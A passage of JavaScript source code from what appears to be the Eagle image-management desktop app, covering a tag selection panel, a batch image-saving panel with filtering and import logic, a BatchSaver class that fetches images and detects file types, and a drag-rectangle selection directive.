                        var popupWidth = $selectPanel.width();
                        var popupTop = $selectPanel.offset().top;
                        var popupLeft = $selectPanel.offset().left;

                        if (popupLeft + popupWidth > windowWidth) {
                            var move = popupLeft + popupWidth - windowWidth + 20;
                            $selectPanel.css("left", `${popupLeft - move}px`);
                        }

                        if (popupHeight + 60 + popupTop > windowHeight) {
                            popupHeight = windowHeight - 60;
                            const height = Math.max(120, popupHeight - popupTop);
                            $selectPanel.height(height);
                        }
                    }
                }, 333);
            });

            scope.updateSelected = () => {
                scope.TagManager.getSuggestTags($bodyScope.selected);
                $timeout(() => {
                    const originSelected = eagle.inspector.newTags.reduce((acc, cur) => {
                        acc[cur] = true;
                        return acc;
                    }, {});

                    panel.init({
                        ...panel.originalParams,
                        tagManager: scope.TagManager,
                        selectedTags: originSelected,
                    });
                }, 50);
            };

            scope.$watchCollection("selected", (newValue, oldValue) => {
                if (scope.isPined) {
                    scope.updateSelected();
                }
            });

            scope.$on('INSPECTOR.TAG.SELECT.PANEL.OPEN', (event, params) => {

                const originSelected = eagle.inspector.newTags.reduce((acc, cur) => {
                    acc[cur] = true;
                    return acc;
                }, {});

                panel.init({
                    tagManager: scope.TagManager,
                    selectedTags: originSelected,
                    onAdd: (tags) => {
                        console.log(`onAdd: ${tags}`);
                        scope.TagManager.addTags(tags);
                        $bodyScope.calculateImageBinding({ ignoreSort: true }, () => {});
                    },
                    onRemove: (tags) => {
                        console.log(`onRemove: ${tags}`);
                        tags.forEach(tag => {
                            scope.TagManager.removeTag(tag);
                        });
                        $bodyScope.calculateImageBinding({ ignoreSort: true }, () => {});
                    }
                });

                scope.updateSelected();

                $timeout(() => {
                    panel.open();
                }, 0);

                Object.assign(scope, {
                    panel: panel,
                    listData: panel.listData,
                    toggleSidebar: () => {
                        panel.toggleSidebar();
                    },
                    selectGroup: (group) => {
                        panel.selectGroup(group);
                    },
                    openItem: (event, item) => {
                        panel.openItem(event, item);
                    },
                    hoverItem: (item) => {
                        panel.hoverItem(item.index);
                    },
                    close: () => {
                        panel.close();
                    },
                    focusSearchInput: () => {
                        panel.focusSearchInput();
                    },
                });
            });
        }
    }
})
EagleApp.directive('batchSavePanel', function($timeout, $rootScope, $filter) {
    return {
        restrict: 'E',
        templateUrl: 'js/directives/batch-save-panel.html',
        scope: {
            theme: '=theme',
            folders: "=folders",
            folderMappings: "=folderMappings",
            uploadQueue: "=uploadQueue",
            uploadUrls: "=uploadUrls",
            addToRecentFolders: "=addToRecentFolders",
            TagManager: "=tagManager",
        },
        link: ($scope, element) => {

            const ipcRenderer = require('electron').ipcRenderer;
            const batchSaver = new BatchSaver(() => {
                calculateResult();
                $scope.$evalAsync();
            });

            $scope.isOpen = false;

            // 事件處理
            $scope.$on("IMPORT_IMAGES", (e, params) => {
                $scope.isOpen = true;
                init(params);
            });

            ipcRenderer.on("open-batch-save-panel", (event, params) => {
                $scope.isOpen = true;
                init(params);
                $scope.$evalAsync();
            });


            function init(params) {

                // Note: 取消全域选取的图片
                $bodyScope.selected = [];
                $scope.params = params;
                $scope.items = [];
                $scope.displayed = [];
                $scope.selected = [];
                $scope.importFolders = params.importFolders || [];
                $scope.tags = [];
                $scope.url = params.url || "";
                $scope.batchSaver = batchSaver;
                $scope.filter = {
                    ext: undefined,
                    size: undefined,
                    keyword: undefined,
                    domain: undefined,
                };

                $scope.counts = {
                    ext: {},
                    size: {},
                    domain: {},
                    selected: {
                        ext: {},
                        size: {},
                        domain: {},
                    },
                    total: 0
                };

                $scope.listSize = 150;


                // 修改 refer 避免图片呈现不出来
                try {
                    const refer = $scope.url.match(/^https?\:\/\/([^\/?#]+)(?:[\/?#]|$)/i) && $scope.url.match(/^https?\:\/\/([^\/?#]+)(?:[\/?#]|$)/i)[0];
                    remote.require('electron-referer')(refer, remote.getCurrentWindow());
                }
                catch (err) {
                    console.error(err);
                }

                let uniqueUrls = {};
                let tasks = [];
                params.images.forEach((image) => {
                    if (!uniqueUrls[image.src]) {
                        uniqueUrls[image.src] = true;
                        tasks.push({
                            src: image.src,
                            url: image.url,
                            title: image.title,
                            width: image.width,
                            height: image.height,
                        });
                    }
                });

                $scope.items = batchSaver.loadTasks(tasks);

                calculateResult();
                $scope.updateSelectedCount();
                $scope.focusInput();
                setTimeout(() => {
                    $scope.focusInput();
                }, 200);
                analytics.event('BatchCollect', 'Open');
            };

            function calculateResult(ignoreCalculateExtensionCount) {

                $scope.counts = {
                    ext: {},
                    size: {},
                    domain: {},
                    selected: {
                        ext: {},
                        size: {},
                        domain: {},
                    },
                    has: {
                        ext: {},
                        size: {},
                        domain: {},
                    },
                    total: 0,
                };

                $scope.counts.total = $scope.items.length;

                // 計算域名及對應數量
                $scope.domainMappings = {};
                $scope.domains = [];
                $scope.items.forEach((item) => {
                    if (item.url) {
                        let url = new URL(item.url);
                        let domain = url.hostname;
                        if (!$scope.domainMappings[domain]) {
                            $scope.domainMappings[domain] = true;
                            $scope.domains.push(domain);
                            $scope.counts.has.domain[domain] = true;
                        }
                        // update ext size has map
                        const image = item.large ?? item.original;
                        $scope.counts.has.ext[image.ext] = true;
                        $scope.counts.has.size[image.size] = true;
                    }
                });

                // 排序 domains，依據數量多寡
                $scope.domains = $scope.domains.sort((a, b) => {
                    return $scope.counts.domain[b] - $scope.counts.domain[a];
                });


                $scope.displayed = [...$scope.items];

                // 類型篩選
                if ($scope.filter.ext) {
                    $scope.displayed = $scope.displayed.filter((item) => {
                        const image = item.large ?? item.original;
                        if (image?.ext === undefined) return false;
                        if ($scope.filter.ext === undefined) return true;
                        return image.ext === $scope.filter.ext;
                    });
                }

                // 大小篩選
                if ($scope.filter.size) {
                    if ($scope.filter.size === "advanced") {
                        if (batchSaver.filterMinW || batchSaver.filterMinH || batchSaver.filterMaxW || batchSaver.filterMaxH) {
                            $scope.displayed = $scope.displayed.filter((item) => {
                                const image = item.large ?? item.original;
                                if (image?.width === undefined || image?.height === undefined) return false;
                                if (batchSaver.filterMinW && image.width < batchSaver.filterMinW) return false;
                                if (batchSaver.filterMinH && image.height < batchSaver.filterMinH) return false;
                                if (batchSaver.filterMaxW && image.width > batchSaver.filterMaxW) return false;
                                if (batchSaver.filterMaxH && image.height > batchSaver.filterMaxH) return false;
                                return true;
                            });
                        }
                    }
                    else {
                        $scope.displayed = $scope.displayed.filter((item) => {
                            const image = item.large ?? item.original;
                            if (image?.size === undefined) return false;
                            if ($scope.filter.size === undefined) return true;
                            return image.size === $scope.filter.size;
                        });
                    }
                }

                // 網域篩選
                if ($scope.filter.domain) {
                    $scope.displayed = $scope.displayed.filter((item) => {
                        if (item?.url === undefined) return false;
                        let url = new URL(item.url);
                        return url.hostname === $scope.filter.domain;
                    });
                }

                // 關鍵字篩選
                if ($scope.filter.keyword) {
                    $scope.displayed = $scope.displayed.filter((item) => {
                        if (item?.title === undefined) return false;
                        let title = item.title;
                        let ext = item.large?.ext ?? item.original?.ext;
                        let fileName = `${title}.${ext}`.toLowerCase();
                        let keywords = $scope.filter.keyword.split(" ");
                        let isMatch = true;
                        for (let i = 0; i < keywords.length; i++) {
                            let keyword = keywords[i].toLowerCase();
                            let idx = fileName.indexOf(keyword);
                            if (idx === -1) isMatch = false;
                        }
                        return isMatch;
                    });
                }

                // 將寬、高少於 200px 的放在最尾端，並針對這些圖片進行寬度大小排序
                const smalls = $scope.displayed.filter((item) => {
                    const image = item.large ?? item.original;
                    return image.width < 200 || image.height < 200;
                }).sort((a, b) => {
                    const imageA = a.large ?? a.original;
                    const imageB = b.large ?? b.original;
                    if (imageA.width < imageB.width) {
                        return 1;
                    }
                    else if (imageA.width > imageB.width) {
                        return -1;
                    }
                    else {
                        return 0;
                    }
                });

                const bigs = $scope.displayed.filter((item) => {
                    return smalls.indexOf(item) === -1;
                });

                $scope.displayed = [...bigs, ...smalls];

                console.log($scope.items.length, $scope.displayed.length);
                console.log($scope.counts);

                $scope.displayed.forEach((item) => {
                    const image = item.large ?? item.original;
                    $scope.counts.ext[image.ext] = ($scope.counts.ext[image.ext]) ? $scope.counts.ext[image.ext] + 1 : 1;
                    $scope.counts.size[image.size] = ($scope.counts.size[image.size]) ? $scope.counts.size[image.size] + 1 : 1;
                    if (item.url) {
                        let url = new URL(item.url);
                        let domain = url.hostname;
                        $scope.counts.domain[domain] = ($scope.counts.domain[domain]) ? $scope.counts.domain[domain] + 1 : 1;
                    }
                });

                $scope.updateSelectedCount();
            }

            function initMouseWheelEvent(element) {
                element.find(".gallery").on("mousewheel.zoomming", (e) => {
                    if (e.altKey || e.ctrlKey) {
                        e.preventDefault();
                        e.stopPropagation();
                    }
                });

                element.find(".gallery").on("mousewheel.zoomming", throttle((e) => {
                    if (e.altKey || e.ctrlKey) {
                        e.preventDefault();
                        e.stopPropagation();
                        var speedControl = 2;
                        if (process.platform == 'darwin') {
                            speedControl = 1;
                        }
                        var delta = Math.abs(e.originalEvent.wheelDelta / 20);
                        var ne = e.originalEvent.wheelDelta / Math.abs(e.originalEvent.wheelDelta) || 1;
                        if (delta < 10) delta = 10;
                        if (delta > 80) delta = 80;
                        delta = ne * delta * speedControl;
                        $scope.listSize += (delta * 1.2);
                        $scope.listSize = Math.floor($scope.listSize / 5) * 5;
                        if ($scope.listSize > 600) $scope.listSize = 600;
                        if ($scope.listSize < 50) $scope.listSize = 50;
                        $("#batch-save-panel-slider").val($scope.listSize);
                        $scope.$evalAsync();
                        return false;
                    }
                }, 50, true));
            }

            $scope.selectFolders = ($event) => {

                const folders = $scope.folders;
                let originalSelectedIds = $scope.importFolders.reduce((map, folder) => {
                    map[folder.id] = true;
                    return map;
                }, {});

                FolderSelectPanel.open({
                    folders: folders,
                    selectedIds: originalSelectedIds,
                    onChanged: (result) => {
                        if (!result?.isDirty) return;

                        const { selectedFolderIds, deselectedFolderIds } = result;

                        $scope.importFolders = [];
                        Object.keys(selectedFolderIds).forEach((id) => {
                            let folder = $scope.folderMappings[id];
                            if (folder) {
                                $scope.importFolders.push(folder);
                            }
                        });
                        $scope.$evalAsync();
                    },
                    onClosed: () => {
                        $scope.focusInput();
                    }
                });
            };

            $scope.removeImportFolder = (event, folder) => {
                event.stopPropagation();
                $scope.importFolders = $scope.importFolders.filter((fd) => {
                    return fd.id !== folder.id;
                });
            };

            $scope.selectTags = ($event) => {
                const originSelected = $scope.tags.reduce((acc, cur) => {
                    acc[cur] = true;
                    return acc;
                }, {});

                TagSelectPanel.open({
                    tagManager: $scope.TagManager,
                    selectedTags: originSelected,
                    onChanged: (result) => {

                        if (!result?.isDirty) return;
                        const { selectedTags, deselectedTags } = result;

                        if (Object.keys(selectedTags).length > 0) {
                            let tags = [];
                            Object.keys(selectedTags).forEach((tag) => {
                                if (originSelected[tag]) return;
                                tags.push(tag);
                            });
                            $scope.tags = [...$scope.tags, ...tags];
                        }

                        if (Object.keys(deselectedTags).length > 0) {
                            $scope.tags = $scope.tags.filter((tag) => {
                                return !deselectedTags[tag];
                            });
                        }

                        $scope.$evalAsync();
                    },
                    onClosed: () => {
                        $scope.focusInput();
                    }
                });
            };

            $scope.removeImportTag = (event, t) => {
                event.stopPropagation();
                $scope.tags = $scope.tags.filter((tag) => {
                    return tag !== t;
                });
            };

            $scope.onFilterChange = () => {
                calculateResult(true);
            };

            $scope.focusMinWInput = () => {
                setTimeout(() => {
                    $("#batch-saver-min-w").focus();
                }, 100);
            };

            $scope.focusInput = () => {
                $("#batch-save-panel-input").focus();
            };

            $scope.onKeyup = (event) => {
                event.stopPropagation();
                event.preventDefault();
                var keyCode = event.keyCode;
                if (keyCode === 65) {
                    if (event.metaKey || event.ctrlKey) {
                        $scope.selectAll();
                    }
                }
                else if (keyCode === 27) {
                    if ($scope.selected.length > 0) {
                        $scope.selected = [];
                        $scope.updateSelectedCount();
                    }
                    else {
                        $scope.close();
                    }
                }
                else if (keyCode === 46 || keyCode === 8) {
                    $scope.removeSelected(event);
                }
                else if (keyCode === 70) {
                    if (event.metaKey || event.ctrlKey) {
                        $("#batch-save-panel-search").focus();
                    }
                    else {
                        $scope.selectFolders(event);
                    }
                }
                else if (keyCode === 84) {
                    $scope.selectTags(event);
                }
                else if (keyCode === 13) {
                    if (event.metaKey || event.ctrlKey) {
                        $scope.import();
                    }
                }
                else if (keyCode === 107 || keyCode === 61 || keyCode === 187) {
                    $scope.zoomIn();
                }
                else if (keyCode === 109 || keyCode === 189) {
                    $scope.zoomOut();
                }
            };

            // 全选
            $scope.selectAll = () => {
                $scope.selected = [...$scope.selected, ...$scope.displayed];
                $scope.selected = [...new Set($scope.selected)];
                $scope.updateSelectedCount();
            };

            // 反选
            $scope.invertSelected = () => {
                $scope.selected = $scope.items.filter((item) => {
                    return $scope.selected.indexOf(item) === -1;
                });
                $scope.updateSelectedCount();
            };

            $scope.isSelected = (item) => $scope.selected.indexOf(item) !== -1;

            $scope.select = (event, item) => {

                event && event.stopPropagation();
                $scope.focusInput();

                var idx = $scope.selected.indexOf(item);
                var selectIdx = $scope.displayed.indexOf(item);

                if (idx !== -1) {
                    $scope.selected.splice(idx, 1);
                    $scope.updateSelectedCount();
                    return;
                }

                if (event.shiftKey) {
                    if ($scope.lastIdx !== undefined) {
                        if ($scope.lastIdx > selectIdx) {
                            for (var i = selectIdx; i <= $scope.lastIdx; i++) {
                                $scope.selected.push($scope.displayed[i]);
                            }
                        }
                        else {
                            for (var i = $scope.lastIdx; i <= selectIdx; i++) {
                                $scope.selected.push($scope.displayed[i]);
                            }
                        }
                    }
                    else {
                        $scope.selected.push(item);
                    }
                }
                else if (idx === -1) {
                    $scope.selected.push(item);
                    $scope.lastIdx = $scope.displayed.indexOf(item);
                }
                $scope.selected = [...new Set($scope.selected)];
                $scope.updateSelectedCount();
            };

            $scope.removeSelected = (event) => {
                event.stopPropagation();
                $scope.items = $scope.items.filter((item) => {
                    return $scope.selected.indexOf(item) === -1;
                });
                $scope.selected = [];
                calculateResult();
                $scope.updateSelectedCount();
            };

            $scope.updateSelectedCount = () => {
                $scope.counts.selected = {
                    ext: {},
                    size: {},
                    domain: {},
                };
                $scope.selected.forEach((item) => {
                    const image = item.large ?? item.original;
                    $scope.counts.selected.ext[image.ext] = ($scope.counts.selected.ext[image.ext]) ? $scope.counts.selected.ext[image.ext] + 1 : 1;
                    $scope.counts.selected.size[image.size] = ($scope.counts.selected.size[image.size]) ? $scope.counts.selected.size[image.size] + 1 : 1;
                    if (item.url) {
                        let url = new URL(item.url);
                        let domain = url.hostname;
                        $scope.counts.selected.domain[domain] = ($scope.counts.selected.domain[domain]) ? $scope.counts.selected.domain[domain] + 1 : 1;
                    }
                });
            };

            $scope.zoomIn = (event) => {
                $scope.listSize += 50;
                if ($scope.listSize > 600) $scope.listSize = 600;
                if ($scope.listSize < 50) $scope.listSize = 50;
            };

            $scope.zoomOut = (event) => {
                $scope.listSize -= 50;
                if ($scope.listSize > 600) $scope.listSize = 600;
                if ($scope.listSize < 50) $scope.listSize = 50;
            };

            $scope.import = () => {

                if ($scope.selected.length === 0) return;

                var names = [];
                var websiteUrls = [];
                var imageUrls = [];
                var duplicateNameMappings = {};

                // 避免图片名称一模一样，如果一样就加上序号
                $scope.selected.forEach((item) => {
                    if (duplicateNameMappings[item.title] === undefined) {
                        duplicateNameMappings[item.title] = 1;
                    }
                    else {
                        duplicateNameMappings[item.title]++;
                        item.title += " (" + duplicateNameMappings[item.title] + ")";
                    }
                });

                $scope.selected.reverse();
                $scope.selected.forEach((item) => {
                    const large = item.large;
                    const original = item.original;

                    if (item) {
                        names.push(item.title);
                        websiteUrls.push(item.url ?? $scope.url ?? "");
                        if (item.hasLarge) {
                            imageUrls.push(large?.base64 ?? large?.src ?? original?.src ?? item.src);
                        }
                        else {
                            imageUrls.push(original.base64 ?? original.src ?? item.src);
                        }
                        $scope.uploadQueue.push({});
                    }
                });

                const folderIds = $scope.importFolders.map((fd) => fd.id);
                const tags = $scope.tags;

                $scope.uploadUrls(imageUrls, folderIds, {
                    names: names,
                    urls: websiteUrls,
                    tags: tags,
                });

                $scope.addToRecentFolders(folderIds);
                $scope.close();
                $scope.$evalAsync();
            };

            $scope.cancel = () => {
                $scope.close();
            };

            $scope.close = () => {
                $scope.isOpen = false;
                $scope.items = [];
                $scope.selected = [];
            };

            initMouseWheelEvent(element);
        }
    }
});

class BatchSaver {

    constructor(onChange) {
        this.onChange = throttle(onChange, 100, true);
    }

    // 轉換格式
    loadTasks(tasks) {
        let result = [];
    
        for (let task of tasks) {
    
            let item = { 
                src: task.src, 
                url: task.url, 
                title: task.title,
                original: {
                    title: task.title,
                    url: task.url,
                    src: task.src,
                    width: task.width,
                    height: task.height,
                    type: "image",
                    ext: "Other"
                },
            };
    
            this.loadOriginal(item).then(() => {
                this.onChange();
            });
    
            this.loadLarge(item).then(() => {
                this.onChange();
            });
    
            result.push(item);
        }
    
        return result;
    }
    
    // 載入原始圖片資訊
    async loadOriginal(item) {
        return new Promise(async (resolve, reject) => {
            await this.loadImage(item, item.src, 'original');
            return resolve(item);
        });
    }
    
    // 載入大圖資訊
    async loadLarge(item) {
        return new Promise(async (resolve, reject) => {
            if (eagle.urlEnlarger.isEnlargable(item.src)) {
                const { url: src, largeUrl: largeSrc } = await eagle.urlEnlarger.enlarge(item.src);
                if (largeSrc && src !== largeSrc) {
                    item.hasLarge = true;
                    await this.loadImage(item, largeSrc, 'large');
                    return resolve(item);
                }
                else {
                    item.hasLarge = false;
                    return resolve(item);
                }
            }
            else {
                item.hasLarge = false;
                return resolve(item);
            }
        });
    }
    
    // 載入圖片資訊
    async loadImage(item, src, objectKey) {
        return new Promise(async (resolve, reject) => {
    
            // 將 Blob 轉換成 Base64
            const blobToBase64 = async (blob) => {
                return new Promise((resolve, reject) => {
                    let reader = new FileReader();
                    reader.onload = () => {
                        let dataUrl = reader.result;
                        resolve(dataUrl);
                    };
                    reader.readAsDataURL(blob);
                });
            }

            const getBlobMimeType = async (blob) => {
                return new Promise((resolve, reject) => {
                    const fileReader = new FileReader();

                    fileReader.onloadend = function (e) {
                        const arr = (new Uint8Array(e.target.result)).subarray(0, 4);
                        let header = '';
                        for (let i = 0; i < arr.length; i++) {
                            header += arr[i].toString(16).padStart(2, '0');
                        }

                        let mimeType = 'unknown';

                        // Check the file signature against known types
                        switch (header) {
                            case '89504e47':
                                mimeType = 'image/png';
                                break;
                            case '47494638':
                                mimeType = 'image/gif';
                                break;
                            case 'ffd8ffe0':
                            case 'ffd8ffe1':
                            case 'ffd8ffe2':
                            case 'ffd8ffe3':
                                mimeType = 'image/jpeg';
                                break;
                            // webp
                            case '52494646':
                                mimeType = 'image/webp';
                                break;
                            // avif
                            case '41564946':
                                mimeType = 'image/avif';
                                break;
                            // mp4
                            case '66747970':
                                mimeType = 'video/mp4';
                                break;
                            // webm
                            case '1a45dfa3':
                                mimeType = 'video/webm';
                                break;
                            // Add more cases for different file types here
                            default:
                                mimeType = 'application/octet-stream'; // default binary type
                        }
                        resolve(mimeType);
                    };

                    fileReader.onerror = function (e) {
                        reject(e);
                    };

                    fileReader.readAsArrayBuffer(blob.slice(0, 4));
                });
            }

            let result = {};
            if (src.startsWith('data:image')) {
                // 如果URL是base64編碼的圖片數據，則不需要進行fetch下載
                result.blobUrl = src;
                result.base64 = src;
                result.width = item.width;
                result.height = item.height;
                result.ext = this.getExtension(src);
                result.type = "image";
                result.size = this.getSize(item.width, item.height);
                result.resolution = this.getResolution(item.width, item.height);
            } else {
                try {
                    let response = await fetch(src);
                    let contentType = response.headers.get('content-type') || '';
                    let contentDisposition = response.headers.get('content-disposition') || '';

                    if (!response.ok) {
                        result.ext = this.getExtension(src);
                        result.type = (result.ext === "mp4" || result.ext === "webm") ? "video" : "image";
                        result.width = item?.original?.width || 0;
                        result.height = item?.original?.height || 0;
                        result.size = this.getSize(result.width, result.height);
                        result.resolution = `${item?.original?.width || 0} x ${item?.original?.height || 0}`;
                    }
                    else {
                        result.contentType = contentType;
                        result.type = contentType.split('/')[0];

                        if (contentType === "application/octet-stream") {
                            let blob = await response.blob();
                            const cdResult = this.getContentDispositionType(contentDisposition);
                            
                            if (cdResult.type) {
                                result.type = cdResult.type;
                                result.ext = cdResult.ext;
                            }
                            else {
                                let mimeType = await getBlobMimeType(blob);
                                result.contentType = mimeType;
                                result.type = mimeType.split('/')[0];     
                                result.ext = this.getExtension(mimeType);                   
                            }

                            result.blobUrl = src;
                        }
                        else if (contentType.includes('image/')) {
                            // let blob = await response.blob();
                            // let blobUrl = URL.createObjectURL(blob);
                            // let base64 = await blobToBase64(blob);
                            
                            result.ext = this.getExtension(contentType);
                            // result.blob = blob;
                            // result.blobUrl = blobUrl;
                            // result.base64 = base64;
                            // release blob 
                            // URL.revokeObjectURL(blobUrl);

                            result.blobUrl = src;
                        }
                        else if (contentType.includes('video/')) {
                            result.src = src;
                            result.ext = this.getExtension(contentType);
                        }
                    }
                }
                catch (err) {
                    // debugger
                }
            }
            
            if (result.type === "image") {
                // 這裡可以獲取圖片的寬高
                let image = new Image();
                const releaseImage = () => {
                    image.onload = null;
                    image.onerror = null;
                    image.scr = "";
                    image = null;
                };
                image.onload = () => {
                    result.width = image.width;
                    result.height = image.height;
                    result.size = this.getSize(result.width, result.height);
                    result.resolution = this.getResolution(result.width, result.height);
                    releaseImage();
                    return resolve(item);
                }
                image.onerror = () => {
                    result.width = 0;
                    result.height = 0;
                    result.size = this.getSize(result.width, result.height);
                    result.resolution = this.getResolution(result.width, result.height);
                    releaseImage();
                    return resolve(item);
                }
                image.src = result.blobUrl || result.src;
            }
            else if (result.type === "video") {
                let video = document.createElement('video');
                video.onloadedmetadata = () => {
                    result.width = video.videoWidth || item?.original?.width || 0;
                    result.height = video.videoHeight || item?.original?.height || 0;
                    result.video = video;
                    result.duration = video.duration;
                    result.size = this.getSize(result.width, result.height);
                    result.resolution = this.getResolution(result.width, result.height);
                    return resolve(item);
                }
                video.onerror = () => {
                    result.width = result.width || item?.original?.width || 0;
                    result.height = result.height || item?.original?.height || 0;
                    result.duration = 0;
                    result.size = this.getSize(result.width, result.height);
                    result.resolution = this.getResolution(result.width, result.height);
                    return resolve(item);
                }
                video.src = result.blobUrl || result.src;
            }
            item[objectKey] = result;
        });
    }

    getSize(width, height) {
        if (width >= 600 || height >= 600) {
            return "large";
        }
        else if (width >= 160 || height >= 160) {
            return "medium";
        }
        return "small";
    }

    getResolution(width, height) {
        return `${width} x ${height}`;
    }

    getContentDispositionType (str) {
        str = str.toLowerCase();
        if (str.indexOf(".mp4") > -1) {
            return {
                type: "video",
                ext: "mp4"
            }
        }
        if (str.indexOf(".webm") > -1) {
            return {
                type: "video",
                ext: "webm"
            }
        }
        else if (str.indexOf(".png") > -1) {
            return {
                type: "image",
                ext: "png"
            }
        }
        else if (str.indexOf(".avif") > -1) {
            return {
                type: "image",
                ext: "avif"
            }
        }
        else if (str.indexOf(".jpg") > -1) {
            return {
                type: "image",
                ext: "jpg"
            }
        }
        else if (str.indexOf(".jpeg") > -1) {
            return {
                type: "image",
                ext: "jpeg"
            }
        }
        else if (str.indexOf(".svg") > -1) {
            return {
                type: "image",
                ext: "svg"
            }
        }
        else if (str.indexOf(".webp") > -1) {
            return {
                type: "image",
                ext: "webp"
            }
        }
        else if (str.indexOf(".gif") > -1) {
            return {
                type: "image",
                ext: "gif"
            }
        }
        return {};
    }

    getExtension(str) {
        str = str.toLowerCase();
        if (str.indexOf("png") > -1) {
            return "png";
        }
        else if (str.indexOf("avif") > -1) {
            return "avif";
        }
        else if (str.indexOf("jpg") > -1) {
            return "jpg";
        }
        else if (str.indexOf("jpeg") > -1) {
            return "jpg";
        }
        else if (str.indexOf("svg") > -1) {
            return "svg";
        }
        else if (str.indexOf("webp") > -1) {
            return "webp";
        }
        else if (str.indexOf("gif") > -1) {
            return "gif";
        }
        else if (str.indexOf("mp4") > -1) {
            return "mp4";
        }
        else if (str.indexOf("webm") > -1) {
            return "webm";
        }
        return "other";
    }

    get showTags() {
        return localStorage['eagle.batchSaver.showTags'] !== 'false';
    }
    set showTags(value) {
        localStorage['eagle.batchSaver.showTags'] = value;
    }

    get showFolders() {
        return localStorage['eagle.batchSaver.showFolders'] !== 'false';
    }
    set showFolders(value) {
        localStorage['eagle.batchSaver.showFolders'] = value;
    }

    get showSize() {
        return localStorage['eagle.batchSaver.showSize'] !== 'false';
    }
    set showSize(value) {
        localStorage['eagle.batchSaver.showSize'] = value;
    }

    get showExt() {
        return localStorage['eagle.batchSaver.showExt'] !== 'false';
    }
    set showExt(value) {
        localStorage['eagle.batchSaver.showExt'] = value;
    }

    get showDomains() {
        return localStorage['eagle.batchSaver.showDomains'] !== 'false';
    }
    set showDomains(value) {
        localStorage['eagle.batchSaver.showDomains'] = value;
    }

    get filterMinW() {
        return (localStorage['eagle.batchSaver.filterMinW'])? parseInt(localStorage['eagle.batchSaver.filterMinW']) : undefined;
    }
    set filterMinW(value) {
        if (value !== undefined) localStorage['eagle.batchSaver.filterMinW'] = parseInt(value) || "";
    }

    get filterMinH() {
        return (localStorage['eagle.batchSaver.filterMinH'])? parseInt(localStorage['eagle.batchSaver.filterMinH']) : undefined;
    }
    set filterMinH(value) {
        if (value !== undefined) localStorage['eagle.batchSaver.filterMinH'] = parseInt(value) || "";
    }

    get filterMaxW() {
        return (localStorage['eagle.batchSaver.filterMaxW'])? parseInt(localStorage['eagle.batchSaver.filterMaxW']) : undefined;
    }
    set filterMaxW(value) {
        if (value !== undefined) localStorage['eagle.batchSaver.filterMaxW'] = parseInt(value) || "";
    }

    get filterMaxH() {
        return (localStorage['eagle.batchSaver.filterMaxH'])? parseInt(localStorage['eagle.batchSaver.filterMaxH']) : undefined;
    }
    set filterMaxH(value) {
        if (value !== undefined) localStorage['eagle.batchSaver.filterMaxH'] = parseInt(value) || "";
    }
}

EagleApp.directive('batchRectSelect', ($rootScope) => ({
    link: ($scope, element, attrs) => {

        let rectSelection = {};
        let rectSelecting = false;
        let startX, startY;
        let offset = $(element).offset();
        let $rect = $('<div class="rect"></div>').hide();
        let $boxs;
        let originSelected = [];

        $("#batch-save-panel .gallery").prepend($rect);

        element.on("mousedown", (e) => {

            e.stopPropagation();

            if (e.which != 1) return;
            if (e.metaKey || e.shiftKey || event.ctrlKey) {
                originSelected = $scope.selected.map(function (i) {
                    return i;
                });
            } else {
                originSelected = [];
            }

            offset = $(element).offset();
            $boxs = element.find(".item");
            rectSelection.startX = startX = e.pageX - offset.left;
            rectSelection.startY = startY = e.pageY - offset.top + $(element).scrollTop();
            rectSelecting = true;

            $rect.css({
                top: rectSelection.startY,
                left: rectSelection.startX,
            });
            $rect.show();
        });

        $(window).on("mouseup", (e) => {
            if (!$scope.isOpen) return;
            e.stopPropagation();

            rectSelection = {};
            rectSelecting = false;

            $rect.css({
                top: 0,
                left: 0,
                width: 0,
                height: 0,
            });
            $rect.hide();
        });

        element.on("mousemove", (e) => {
            e.stopPropagation();

            if (rectSelecting) {
                const scrollTop = $(element).scrollTop(), flipX = startX > e.pageX - offset.left, flipY = startY > e.pageY - offset.top + scrollTop;

                rectSelection.w = Math.abs((e.pageX - offset.left) - startX);
                rectSelection.h = Math.abs((e.pageY - offset.top) - startY + scrollTop);

                if (flipX) {
                    rectSelection.startX = startX - rectSelection.w;
                }
                if (flipY) {
                    rectSelection.startY = startY - rectSelection.h;
                }
                $rect.css({
                    top: rectSelection.startY,
                    left: rectSelection.startX,
                    width: rectSelection.w,
                    height: rectSelection.h,
                });

                caculate();
            }
        });

        function contain(element) {
            const a = {
                width: element.width(),
                height: element.height(),
                x: element[0].offsetLeft,
                y: element[0].offsetTop
            }, b = {
                width: rectSelection.w,
                height: rectSelection.h,
                x: rectSelection.startX,
                y: rectSelection.startY
            };
            return !(
                ((a.y + a.height) < (b.y)) ||
                (a.y > (b.y + b.height)) ||
                ((a.x + a.width) < b.x) ||
                (a.x > (b.x + b.width))
            );
        };

        const caculate = throttle(() => {
            let rectSelected = [];
            let miss = 0;
            let hit = 0;
            let BreakException = {};

            try {
                $boxs.each(function () {
                    if (miss > 20) {
                        throw BreakException;
                    };
                    if (contain($(this))) {
                        hit++;
                        const item = angular.element(this).scope().image;
                        if (originSelected.indexOf(item) == -1) {
                            rectSelected.push(item);
                        }
                    }
                    else if (hit > 1) {
                        miss++;
                    }
                });
            }
            catch (e) {
            }

            if (rectSelected.length > 0) {
                $scope.selected = originSelected.concat(rectSelected);
                $scope.$evalAsync();
            }

        }, 100);
    }
}))
EagleApp.directive('duplicateModal', function ($timeout, $rootScope, $filter) {
    return {
        restrict: 'E',
        templateUrl: 'js/directives/duplicate-modal.html',
        scope: {
            theme: '=theme',
            folderMappings: '=folderMappings',
            itemMappings: '=itemMappings',
        },
        link: function ($scope, element, attrs, controllersArr) {
            
            $scope.$body = $bodyScope;
            $scope.duplicateScope = $scope;
            $scope.isOpen = false;
            $scope.left = undefined;
            $scope.right = undefined;
            $scope.duplicates = [];
            $scope.applyAll = 'false';
            $scope.usingExist = 'true';
            rootScope = angular.element("body").scope();

            $("body").on("click", ".duplicate-modal *", function () {
                $("#duplicate-input").focus();
            });

            $scope.$on("OPEN_DUPLICATE", function (e, params) {
                ipcRenderer.send('show');
                $scope.currentFolder = params.currentFolder;
                $scope.mappings = params.mappings;
                $scope.applyAll = 'false';
                params.duplicates.forEach(function (d) {
                    $scope.duplicates.push(d);
                })
                loadFirst();
                $timeout(() => {
                    $scope.isOpen = true;
                    setTimeout(function () {
                        $("#duplicate-input").focus();
                    }, 200);
                }, 300);
            });

            ipcRenderer.on('image.changed', function (event, newImage) {
                if ($scope.duplicates && $scope.duplicates.length > 0) {
                    var hashID = getHashID(newImage);
                    for (var i = 0; i < $scope.duplicates.length; i++) {
                        var img = $scope.duplicates[i];
                        if (hashID == getHashID(img)) {
